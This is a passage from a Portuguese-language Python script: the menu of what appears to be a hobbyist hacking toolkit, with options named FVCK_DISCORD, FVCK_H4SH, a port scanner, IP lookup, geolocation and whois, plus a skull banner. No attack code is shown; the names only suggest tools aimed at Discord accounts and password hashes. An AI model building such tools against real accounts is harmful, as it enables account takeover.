  print(fVermelho + "                     ► PorkScan        (03) ")
  print(fVermelho + "                     ► QualMeuIp?      (04) ")
  print(fVermelho + "                     ► LocalizarIP     (05) ")
  print(fVermelho + "                     ► Wh01s¿          (06) ")
  print(" ")
  print(" ")
  pergunta = input(white + "Olá. Qual opção lhe convém agora? --> ")
  if pergunta == "1":
    sleep(1)
    os.system(['clear', 'cls'][os.name == 'nt'])
    FVCK_DISCORD()
  if pergunta == "3":
    sleep(1)
    os.system(['clear', 'cls'][os.name == 'nt'])
    PorkScan()
  if pergunta == "2":
    sleep(1)
    os.system(['clear', 'cls'][os.name == 'nt'])
    FVCK_H4SH()
  if pergunta == "4":
    os.system(['clear', 'cls'][os.name == 'nt'])
    VER_ip()
  if pergunta == "5":
    os.system(['clear', 'cls'][os.name == 'nt'])
    localizar_ip()
  if pergunta == "6":
    os.system(['clear', 'cls'][os.name == 'nt'])
    whois()
  else:
    os.system(['clear', 'cls'][os.name == 'nt'])
    sleep(1)
    print(fVermelho + """
                          :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!    Número errado, irmão.
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
""")
  exit()
aviso()
sleep(6)
os.system(['clear', 'cls'][os.name == 'nt'])
logo_printer()
sleep(1)
menu_principal()


